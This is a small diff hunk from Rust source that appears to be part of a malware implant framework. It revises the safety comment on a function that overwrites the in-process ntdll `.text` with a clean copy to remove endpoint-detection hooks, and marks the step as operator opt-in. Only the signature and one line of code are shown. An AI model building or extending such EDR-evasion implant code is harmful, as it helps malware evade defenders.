@@ -810,9 +810,12 @@ pub unsafe fn text_diff_count(
 ///
 /// # Safety
 /// Maps `\KnownDlls\ntdll` / reads the disk file (see `fresh_ntdll_text*`),
-/// parses the live ntdll headers, and overwrites the in-process `.text`. Call
-/// once at bootstrap from the single beacon thread (same discipline as
-/// `syscalls::init_global`).
+/// parses the live ntdll headers, and overwrites the in-process `.text`.
+/// **Opt-in only — NOT part of the default bootstrap.** When an operator
+/// explicitly enables it, call once during bootstrap from the single beacon
+/// thread (same discipline as `syscalls::init_global`), and always BEFORE
+/// `BlindKit` (see the ordering constraint above). The default-off decision
+/// is documented on `LiveUnhook` in `implant-evasion/src/evasion_glue.rs`.
 pub unsafe fn restore_ntdll_text() -> Result<usize, &'static str> {
     let hooked_base =
         crate::resolve::module_base_by_name(b"ntdll.dll").ok_or("in-process ntdll base")?;
